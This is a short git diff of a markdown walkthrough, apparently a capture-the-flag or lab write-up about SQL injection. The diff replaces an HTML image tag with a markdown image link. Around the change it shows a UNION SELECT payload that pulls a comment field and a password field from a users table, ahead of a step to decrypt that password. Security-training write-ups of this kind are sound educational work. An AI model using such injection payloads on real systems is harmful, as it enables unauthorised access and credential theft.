@@ -43,8 +43,7 @@ By tring all the columns, with using columns `Commentaire`, and `Countersign`, t
 ```
 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
 ```
-
-<img width="1077" alt="image" src="https://user-images.githubusercontent.com/46742040/202273426-4ce4365e-d857-44a7-8b5b-2ac5e03e32d4.png">
+![1 AND 1=1 UNION SELECT Commentaire, countersign FROM users](https://user-images.githubusercontent.com/22397481/209451385-c97a6a2b-0a89-440d-810d-5262b6d63877.jpeg)
 
 as it shows, let's decrypt the password
 ```
